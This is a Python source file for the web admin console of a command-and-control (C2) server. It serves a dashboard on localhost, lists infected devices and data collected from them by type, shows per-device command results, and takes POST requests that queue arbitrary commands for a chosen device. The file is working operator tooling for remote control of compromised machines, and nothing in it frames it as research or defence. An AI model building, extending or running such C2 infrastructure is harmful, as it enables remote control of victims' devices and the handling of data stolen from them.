import json
import log_util
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

from command_manager import CommandManager
from data_view import serve_data_listing, serve_command_results, serve_devices_listing
from log_util import logger


class WebAdminConsole:
    """
    Web-based admin console for interacting with the C2 server
    """

    def __init__(self, port=8080):
        self.port = port
        self.server = None
        self.server_thread = None

    def start(self):
        """Start the web admin console"""

        class AdminRequestHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                logger.info("%s - %s", self.address_string(), format % args)

            def do_GET(self):
                if self.path == "/":
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(self._get_dashboard_html().encode())
                elif self.path == "/devices":
                    serve_devices_listing(self)
                elif self.path.startswith("/data/"):
                    data_type = self.path.split("/")[2]
                    serve_data_listing(self, data_type)
                elif self.path.startswith("/command_results/"):
                    device_id = self.path.split("/")[2]
                    serve_command_results(self, device_id)
                else:
                    self.send_response(404)
                    self.end_headers()

            def do_POST(self):
                if self.path == "/command":
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    data = json.loads(post_data.decode('utf-8'))

                    device_id = data.get('device_id')
                    command = data.get('command')

                    if not device_id or not command:
                        self.send_response(400)
                        self.send_header("Content-type", "application/json")
                        self.end_headers()
                        self.wfile.write(
                            json.dumps({"status": "error", "message": "Missing device_id or command"}).encode())
                        return

                    success = CommandManager.add_command(device_id, command)

                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "success" if success else "error"}).encode())
                else:
                    self.send_response(404)
                    self.end_headers()

            def _get_dashboard_html(self):
                """Get the admin console HTML template"""
                script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
                template_path = os.path.join(script_dir, "c2_stuff", "console.html")

                try:
                    with open(template_path, 'r') as f:
                        return f.read()
                except Exception as e:
                    logger.error(f"Error reading admin console template: {str(e)}")
                    return """
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>C2 Server Admin Console</title>
                    </head>
                    <body>
                        <h1>C2 Server Admin Console</h1>
                        <p>Error loading template: {}</p>
                    </body>
                    </html>
                    """.format(str(e))

        # Create server
        self.server = HTTPServer(('localhost', self.port), AdminRequestHandler)

        # Start server in a separate thread
        self.server_thread = threading.Thread(target=self._run_server)
        self.server_thread.daemon = True
        self.server_thread.start()

        logger.info(f"Admin console running at http://localhost:{self.port}")

    def _run_server(self):
        self.server.serve_forever()

    def stop(self):
        """Stop the web admin console"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            logger.info("Admin console stopped")